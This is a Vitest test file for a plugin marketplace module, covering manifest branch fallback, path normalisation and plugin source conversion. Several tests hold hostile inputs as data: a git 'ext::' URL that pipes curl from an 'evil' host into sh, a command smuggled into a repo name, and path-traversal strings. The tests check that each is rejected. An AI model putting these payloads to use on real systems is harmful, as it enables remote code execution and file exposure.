import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { fetchMarketplace, marketplacePluginToSpec, resolvePluginPath, normalizeRepoPath } from "../src/marketplace.js";
import type { MarketplacePlugin } from "../src/types.js";

const MANIFEST = { name: "test-marketplace", plugins: [] };

function okResponse(): Response {
  return new Response(JSON.stringify(MANIFEST), {
    status: 200,
    headers: { "Content-Type": "application/json" },
  });
}

function notFoundResponse(): Response {
  return new Response(null, { status: 404 });
}

function plugin(source: string | MarketplacePlugin["source"]): MarketplacePlugin {
  return { name: "example-plugin", source };
}

beforeEach(() => {
  vi.unstubAllGlobals();
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("fetchMarketplace branch fallback", () => {
  it("uses main when it exists", async () => {
    const fetchMock = vi.fn(async () => okResponse());
    vi.stubGlobal("fetch", fetchMock);

    const { manifest } = await fetchMarketplace("avhb/mkt-main", true);

    expect(manifest.name).toBe("test-marketplace");
    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(String(fetchMock.mock.calls[0][0])).toContain("/main/");
  });

  it("falls back to master when main returns 404", async () => {
    const fetchMock = vi.fn(async (url: string) => {
      if (url.includes("/main/")) return notFoundResponse();
      return okResponse();
    });
    vi.stubGlobal("fetch", fetchMock);

    const { manifest } = await fetchMarketplace("avhb/mkt-main-404", true);

    expect(manifest.name).toBe("test-marketplace");
    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(String(fetchMock.mock.calls[1][0])).toContain("/master/.github/plugin/marketplace.json");
  });

  it("falls back to master when the main request fails", async () => {
    const fetchMock = vi.fn(async (url: string) => {
      if (url.includes("/main/")) throw new Error("network down");
      return okResponse();
    });
    vi.stubGlobal("fetch", fetchMock);

    const { manifest } = await fetchMarketplace("avhb/mkt-main-error", true);

    expect(manifest.name).toBe("test-marketplace");
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });

  it("reports the status when both branches are missing", async () => {
    const fetchMock = vi.fn(async () => notFoundResponse());
    vi.stubGlobal("fetch", fetchMock);

    await expect(fetchMarketplace("avhb/mkt-missing", true)).rejects.toThrow(/HTTP 404/);
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });
});

describe("normalizeRepoPath", () => {
  it("strips leading ./ and slashes", () => {
    expect(normalizeRepoPath("./plugins/example-plugin")).toBe("plugins/example-plugin");
    expect(normalizeRepoPath("/plugins/example-plugin/")).toBe("plugins/example-plugin");
  });

  it("converts Windows separators", () => {
    expect(normalizeRepoPath(".\\plugins\\example-plugin")).toBe("plugins/example-plugin");
  });

  it("rejects parent directory segments", () => {
    expect(() => normalizeRepoPath("../../outside")).toThrow(/Unsafe marketplace path/);
    expect(() => normalizeRepoPath("plugins/../..")).toThrow(/Unsafe marketplace path/);
  });
});

describe("resolvePluginPath", () => {
  it("joins pluginRoot and a relative source", () => {
    expect(resolvePluginPath("example-plugin", "./plugins")).toBe("plugins/example-plugin");
  });

  it("does not duplicate an already-prefixed source", () => {
    expect(resolvePluginPath("./plugins/example-plugin", "./plugins")).toBe("plugins/example-plugin");
  });

  it("returns the source when pluginRoot is missing", () => {
    expect(resolvePluginPath("./plugins/example-plugin")).toBe("plugins/example-plugin");
  });
});

describe("marketplacePluginToSpec", () => {
  it("resolves a bare plugin name against marketplace pluginRoot", () => {
    const spec = marketplacePluginToSpec(plugin("example-plugin"), "acme/marketplace", "./plugins");

    expect(spec.source).toEqual({
      type: "github",
      repo: "acme/marketplace",
      path: "plugins/example-plugin",
    });
  });

  it("does not double the pluginRoot when the source already includes it", () => {
    const spec = marketplacePluginToSpec(plugin("./plugins/example-plugin"), "acme/marketplace", "./plugins");

    expect(spec.source).toEqual({
      type: "github",
      repo: "acme/marketplace",
      path: "plugins/example-plugin",
    });
  });

  it("treats a bare name as a relative path without pluginRoot", () => {
    const spec = marketplacePluginToSpec(plugin("example-plugin"), "acme/marketplace");

    expect(spec.source).toEqual({
      type: "github",
      repo: "acme/marketplace",
      path: "example-plugin",
    });
  });

  it("keeps owner/repo string sources as standalone repositories", () => {
    const spec = marketplacePluginToSpec(plugin("acme/example-plugin"), "acme/marketplace");

    expect(spec.source).toEqual({ type: "github", repo: "acme/example-plugin" });
  });

  it("resolves pluginRoot for prefixed path sources", () => {
    const spec = marketplacePluginToSpec(plugin("plugins/example-plugin"), "acme/marketplace", "plugins");

    expect(spec.source).toEqual({
      type: "github",
      repo: "acme/marketplace",
      path: "plugins/example-plugin",
    });
  });

  it("rejects string sources that traverse above the marketplace repo", () => {
    expect(() => marketplacePluginToSpec(plugin("../../secrets"), "acme/marketplace")).toThrow(
      /Unsafe marketplace path/
    );
  });

  it("rejects parent segments hidden inside a pluginRoot-joined source", () => {
    expect(() => marketplacePluginToSpec(plugin("example/../.."), "acme/marketplace", "plugins")).toThrow(
      /Unsafe marketplace path/
    );
  });

  it("rejects malformed owner/repo string sources", () => {
    expect(() => marketplacePluginToSpec(plugin('acme/evil"; curl'), "acme/marketplace")).toThrow(
      /Unsafe marketplace repo/
    );
  });

  it("converts a safe https url object source to a git source", () => {
    const spec = marketplacePluginToSpec(
      plugin({ source: "url", url: "https://github.com/acme/example-plugin.git" }),
      "acme/marketplace"
    );

    expect(spec.source).toEqual({ type: "git", url: "https://github.com/acme/example-plugin.git" });
  });

  it("rejects a url object source that would run a command", () => {
    expect(() =>
      marketplacePluginToSpec(plugin({ source: "url", url: "ext::sh -c 'curl evil|sh'" }), "acme/marketplace")
    ).toThrow(/Unsafe git url/);
  });

  it("rejects github object sources with a malformed repo", () => {
    expect(() =>
      marketplacePluginToSpec(plugin({ source: "github", repo: "acme/../etc" }), "acme/marketplace")
    ).toThrow(/Unsafe marketplace repo/);
  });

  it("rejects a local file url object source", () => {
    expect(() =>
      marketplacePluginToSpec(plugin({ source: "url", url: "file:///c:/Windows" }), "acme/marketplace")
    ).toThrow(/Unsafe git url/);
  });

  it("converts github object sources", () => {
    const spec = marketplacePluginToSpec(
      plugin({ source: "github", repo: "acme/example-plugin", path: "plugins/example-plugin" }),
      "acme/marketplace",
      "./plugins"
    );

    expect(spec.source).toEqual({
      type: "github",
      repo: "acme/example-plugin",
      path: "plugins/example-plugin",
    });
  });
});
